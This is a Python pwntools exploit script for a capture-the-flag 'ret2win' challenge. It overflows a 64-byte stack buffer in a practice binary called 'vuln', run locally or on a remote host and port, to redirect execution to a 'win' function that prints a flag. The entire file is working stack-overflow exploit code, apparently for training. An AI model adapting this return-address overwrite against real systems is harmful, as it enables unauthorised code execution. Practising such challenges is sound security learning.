#!/usr/bin/env python3
# exploit.py — pwntools exploit to ret2win the vuln binary
# usage:
#   ./exploit.py           # runs local ./vuln
#   ./exploit.py HOST PORT # connect to remote HOST:PORT

from pwn import *
import sys

context.binary = elf = ELF('./vuln', checksec=False)
context.log_level = 'info'  # change to 'debug' for verbose output

# If PIE is disabled (-no-pie) this will be the static address.
try:
    win_addr = elf.symbols['win']
except KeyError:
    log.error("No 'win' symbol found in ELF. Is this the right binary?")
    sys.exit(1)

log.info(f"win() address: {hex(win_addr)}")

# Typical offset for buf[64] on x86_64: 64 (buf) + 8 (saved rbp) = 72
# If you want to measure it exactly, use cyclic / gdb as described in the guide.
offset = 72

def exploit_local():
    p = process('./vuln')
    payload = b'A' * offset + p64(win_addr)
    log.info(f"sending payload ({len(payload)} bytes)")
    p.sendline(payload)
    # read everything (win() prints flag then exits)
    try:
        out = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    except Exception:
        out = p.recv(timeout=2).decode('utf-8', errors='ignore')
    print(out)
    p.close()

def exploit_remote(host, port):
    p = remote(host, int(port))
    payload = b'A' * offset + p64(win_addr)
    log.info(f"sending payload ({len(payload)} bytes) to {host}:{port}")
    p.sendline(payload)
    print(p.recvall(timeout=4).decode('utf-8', errors='ignore'))
    p.close()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        exploit_remote(sys.argv[1], sys.argv[2])
    else:
        exploit_local()
